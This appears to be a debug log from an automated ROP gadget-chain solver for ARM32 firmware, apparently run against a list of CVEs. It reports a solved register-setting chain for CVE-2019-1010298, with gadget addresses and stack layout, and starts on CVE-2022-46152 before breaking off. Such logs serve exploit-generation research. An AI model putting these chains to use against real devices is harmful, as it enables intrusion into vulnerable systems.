+2026-07-18 08:15:55.839 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:15:55.948 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:15:55.997 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:15:56.074 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:15:56.140 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:56.295 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:56.393 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:56.447 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:15:56.460 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:15:56.577 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:15:56.591 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:56.593 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r6, pc}']
+2026-07-18 08:15:56.594 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648636, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:56.598 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:56.599 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1f958']
+2026-07-18 08:15:56.599 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r4, pc}
+2026-07-18 08:15:56.611 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:15:56.654 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:15:56.733 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:56.736 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r6, pc}']
+2026-07-18 08:15:56.737 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648636, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:56.741 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:56.742 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1f958']
+2026-07-18 08:15:56.742 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r4, pc}
+2026-07-18 08:15:56.762 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:15:56.806 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:15:56.832 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b81c', 'rip': 'sp'}]]
+2026-07-18 08:15:56.851 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:56.855 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r6, r7, pc}']
+2026-07-18 08:15:56.855 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:56.859 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22346', 'rip': 'sp'}]]
+2026-07-18 08:15:56.860 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db22346']
+2026-07-18 08:15:56.860 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r5, r7, pc}
+2026-07-18 08:15:56.870 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578'], ['0x8db1ed72']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:15:56.952 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:56.955 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r3, r7, pc}']
+2026-07-18 08:15:56.955 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:56.959 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:56.960 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db22938']
+2026-07-18 08:15:56.960 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r3, r7, pc}
+2026-07-18 08:15:56.967 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578'], ['0x8db1ed72']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c'], ['0x8db1ede6']]}
+2026-07-18 08:15:56.985 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b81c', 'rip': 'sp'}]]
+2026-07-18 08:15:57.008 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1cbb6', 'rip': 'sp'}]]
+2026-07-18 08:15:57.090 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:15:57.124 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1cbb6', 'rip': 'sp'}]]
+2026-07-18 08:15:57.274 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:15:57.294 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:15:57.444 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db00a50', 'rip': 'sp'}]]
+2026-07-18 08:15:57.464 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:15:57.607 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:15:57.628 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:57.754 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:15:57.781 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09ebc', 'rip': 'sp'}]]
+2026-07-18 08:15:57.842 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:57.844 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r4, pc}']
+2026-07-18 08:15:57.845 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648636, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:57.848 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:57.849 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db22938']
+2026-07-18 08:15:57.849 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r3, r7, pc}
+2026-07-18 08:15:57.859 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c'], ['0x8db1f958']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578'], ['0x8db1ed72']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c'], ['0x8db1ede6']]}
+2026-07-18 08:15:57.931 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09ebc', 'rip': 'sp'}]]
+2026-07-18 08:15:57.948 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db01126', 'rip': 'sp'}]]
+2026-07-18 08:15:58.098 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:15:58.101 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:58.104 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r4, pc}']
+2026-07-18 08:15:58.104 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648636, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:58.109 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:15:58.110 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db2d702']
+2026-07-18 08:15:58.110 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r3, r4, r5, pc}
+2026-07-18 08:15:58.111 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db01126', 'rip': 'sp'}]]
+2026-07-18 08:15:58.133 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c'], ['0x8db1f958']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20'], ['0x8db09e6c'], ['0x8db1f958']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578'], ['0x8db1ed72']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c'], ['0x8db1ede6']]}
+2026-07-18 08:15:58.179 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:58.183 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r5, r7, pc}']
+2026-07-18 08:15:58.184 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:58.188 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:15:58.188 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db2be20']
+2026-07-18 08:15:58.189 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r2, r6, pc}
+2026-07-18 08:15:58.202 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c'], ['0x8db1f958']], 'r1': [['0x8db1ede6'], ['0x8db1f962'], ['0x8db2be20'], ['0x8db09e6c'], ['0x8db1f958']], 'r2': [['0x8db03200'], ['0x8db0a3c4'], ['0x8db12578'], ['0x8db1ed72'], ['0x8db22346']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c'], ['0x8db1ede6']]}
+2026-07-18 08:15:58.234 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:58.237 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r5, pc}']
+2026-07-18 08:15:58.238 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648628, 'lr': 0, 'pc': 2377251170}
+2026-07-18 08:15:58.239 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r4, pc}']
+2026-07-18 08:15:58.240 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648640, 'lr': 0, 'pc': 2377134592}
+2026-07-18 08:15:58.241 | DEBUG    | solve_engine:check:1627 - ['pop {r2, pc}']
+2026-07-18 08:15:58.241 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648648, 'lr': 0, 'pc': 2377141930}
+2026-07-18 08:15:58.243 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r5, pc}']
+2026-07-18 08:15:58.243 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 7, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648660, 'lr': 0, 'pc': 3735928326}
+2026-07-18 08:15:58.243 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:15:58.244 | DEBUG    | find_reg_gadget_chain:solve:785 - [32m{0: '0x8db0502c', 1: '0x8dc74c20', 3: '0x8db1f962', 4: '0x1000', 6: '0x8db03200', 7: '0x7', 8: '0x8db04eaa', 9: '0xa', 11: '0xdeadbe06'}[0m
+2026-07-18 08:15:58.290 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:58.358 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:58.361 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r3, r7, pc}']
+2026-07-18 08:15:58.361 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648636, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:58.398 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:15:58.416 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db0ad64', 'rip': 'sp'}]]
+2026-07-18 08:15:58.510 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db0ad64', 'rip': 'sp'}]]
+2026-07-18 08:15:58.519 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db09ebc', 'rip': 'sp'}]]
+2026-07-18 08:15:58.674 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db09ebc', 'rip': 'sp'}]]
+2026-07-18 08:15:58.878 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:58.880 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r3, r7, pc}']
+2026-07-18 08:15:58.880 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648636, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:59.023 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:59.026 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r3, r4, r5, pc}']
+2026-07-18 08:15:59.026 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648636, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:59.048 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:15:59.050 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r2, r6, pc}']
+2026-07-18 08:15:59.050 | DEBUG    | solve_engine:check:1634 - {'r0': 2378648608, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2378648632, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:15:59.349 | SUCCESS  | find_reg_gadget_chain:main:1015 - Find Set Registers Gadget Chain!
+2026-07-18 08:15:59.349 | SUCCESS  | find_reg_gadget_chain:main:1017 - Register Time: 8.631341934204102
+2026-07-18 08:15:59.350 | SUCCESS  | find_reg_gadget_chain:main:1020 - [[{0: '0x8db0502c', 1: '0x8dc74c20', 3: '0x8db1f962', 4: '0x1000', 6: '0x8db03200', 7: '0x7', 8: '0x8db04eaa', 9: '0xa', 11: '0xdeadbe06'}, [['0x8db0502c'], ['0x8db1f962'], ['0x8db03200'], ['0x8db04eaa']]]]
+2026-07-18 08:15:59.355 | SUCCESS  | __main__:main:289 - CVE-2019-1010298 SUCCESS (10.29s)
+2026-07-18 08:15:59.355 | INFO     | __main__:main:302 - Running total: 1 success, 0 fail
+2026-07-18 08:15:59.355 | INFO     | __main__:main:279 - 
+============================================================
+2026-07-18 08:15:59.355 | INFO     | __main__:main:280 - [2/3] CVE-2022-46152
+2026-07-18 08:15:59.356 | INFO     | __main__:main:281 - ============================================================
+2026-07-18 08:15:59.358 | INFO     | __main__:run_one:73 - Arch: arm32, thumb=True
+2026-07-18 08:15:59.370 | INFO     | __main__:run_one:86 - Loaded 6878 gadgets
+2026-07-18 08:15:59.395 | INFO     | __main__:run_one:90 - Memory map: 3 regions, regs: sp=0x8db5eac8
+2026-07-18 08:15:59.405 | INFO     | __main__:run_one:121 - Targets: [('r0', '0x8f700000'), ('r1', '0x1000'), ('r2', '0x7'), ('r3', '0xa')]
+2026-07-18 08:15:59.405 | INFO     | __main__:run_one:171 - SP region too small (12B), pivot to 0x8f700000 (256B)
+2026-07-18 08:15:59.406 | INFO     | __main__:run_one:219 - offset_list: 63 slots, address_map: {7243086: '0xdeadbeef'}
+2026-07-18 08:15:59.406 | INFO     | __main__:run_one:226 - Adjusted virtual_mem_base to 0x8f710000
+2026-07-18 08:15:59.541 | INFO     | find_reg_gadget_chain:main:953 - Get Set Reg Edges
+2026-07-18 08:16:00.975 | INFO     | find_reg_gadget_chain:main:1002 - Find Reg Setting Gadget Chain
+2026-07-18 08:16:00.976 | INFO     | find_reg_gadget_chain:main:1003 - Target Register ['r0', 'r1', 'r2', 'r3']
+2026-07-18 08:16:01.529 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db02114', 'rip': 'sp'}]]
+2026-07-18 08:16:01.532 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db02114', 'rip': 'sp'}]]
+2026-07-18 08:16:01.533 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db02114']
+2026-07-18 08:16:01.534 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, pc}
+2026-07-18 08:16:01.542 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db02114', 'rip': 'sp'}]]
+2026-07-18 08:16:01.580 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db03200', 'rip': 'sp'}]]
+2026-07-18 08:16:01.581 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db03200', 'rip': 'sp'}]]
+2026-07-18 08:16:01.583 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db03200', 'rip': 'sp'}]]
+2026-07-18 08:16:01.584 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db03200']
+2026-07-18 08:16:01.584 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, pc}
+2026-07-18 08:16:01.795 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db0502c', 'rip': 'sp'}]]
+2026-07-18 08:16:01.801 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db0502c', 'rip': 'sp'}]]
+2026-07-18 08:16:01.804 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db0502c']
+2026-07-18 08:16:01.804 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r5, pc}
+2026-07-18 08:16:01.853 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db0502c', 'rip': 'sp'}]]
+2026-07-18 08:16:02.037 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f962', 'rip': 'sp'}]]
+2026-07-18 08:16:02.038 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f962', 'rip': 'sp'}]]
+2026-07-18 08:16:02.041 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f962', 'rip': 'sp'}]]
+2026-07-18 08:16:02.043 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1f962']
+2026-07-18 08:16:02.043 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r4, pc}
+2026-07-18 08:16:02.181 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db04eaa', 'rip': 'sp'}]]
+2026-07-18 08:16:02.200 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db04eaa', 'rip': 'sp'}]]
+2026-07-18 08:16:02.339 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0b612', 'rip': 'sp'}]]
+2026-07-18 08:16:02.343 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0b612', 'rip': 'sp'}]]
+2026-07-18 08:16:02.410 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:02.412 | DEBUG    | solve_engine:check:1627 - ['pop {r3, pc}']
+2026-07-18 08:16:02.413 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481932, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:02.417 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db04eaa', 'rip': 'sp'}]]
+2026-07-18 08:16:02.418 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db04eaa']
+2026-07-18 08:16:02.418 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r5, pc}
+2026-07-18 08:16:02.425 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b132', 'rip': 'sp'}]]
+2026-07-18 08:16:02.438 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b132', 'rip': 'sp'}]]
+2026-07-18 08:16:02.455 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:02.457 | DEBUG    | solve_engine:check:1627 - ['pop {r2, pc}']
